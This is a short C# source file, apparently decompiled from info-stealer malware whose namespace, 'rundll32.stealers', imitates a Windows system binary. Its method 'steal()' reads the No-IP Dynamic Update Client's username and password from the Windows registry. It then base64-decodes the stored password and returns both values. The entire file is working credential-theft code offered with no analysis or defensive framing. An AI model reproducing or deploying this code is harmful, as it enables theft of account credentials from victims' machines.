using System;
using System.Text;
using Microsoft.Win32;

namespace rundll32.stealers;

internal class noip
{
	public struct acount
	{
		public string user;

		public string pass;
	}

	private static string base64Decode(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception("Error in base64Decode" + ex.Message);
		}
	}

	public static acount steal()
	{
		string text = null;
		text = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Username", null);
		string text2 = null;
		text2 = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Password", null);
		acount result = default(acount);
		result.user = text;
		result.pass = base64Decode(text2);
		return result;
	}
}
